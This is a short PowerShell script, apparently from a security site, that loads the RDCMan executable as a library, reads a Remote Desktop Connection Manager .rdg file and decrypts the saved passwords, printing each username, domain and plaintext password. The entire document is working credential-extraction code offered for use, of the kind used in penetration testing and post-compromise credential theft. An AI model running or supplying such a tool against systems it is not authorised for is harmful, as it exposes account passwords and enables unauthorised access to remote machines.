# GetPassRDC.ps1
#
# Custom by: Marcos Henrique
# Site: www.100security.com.br
#
# RDCMan.exe
$RDCMan = "C:\Remote\RDCMan.exe"

# RDG file
$RDGFile = "C:\Remote\win-10.rdg"

# DLL
$DLL = "C:\Remote"
 
Copy-Item $RDCMan "$DLL\RDCMan.dll"
Import-Module "$DLL\RDCMan.dll"
$EncryptionSettings = New-Object -TypeName RdcMan.EncryptionSettings
 
$XML = New-Object -TypeName XML
$XML.Load($RDGFile)

# Credentials
$logonCredentials = Select-XML -Xml $XML -XPath '//credentialsProfile'
 
$Credentials = New-Object System.Collections.Arraylist
$logonCredentials | foreach {
    [void]$Credentials.Add([pscustomobject]@{
    Username = $_.Node.userName
    Password = $(Try{[RdcMan.Encryption]::DecryptString($_.Node.password, $EncryptionSettings)}Catch{$_.Exception.InnerException.Message})
    Domain = $_.Node.domain
    })
    } | Sort Username
 
$Credentials | Sort Username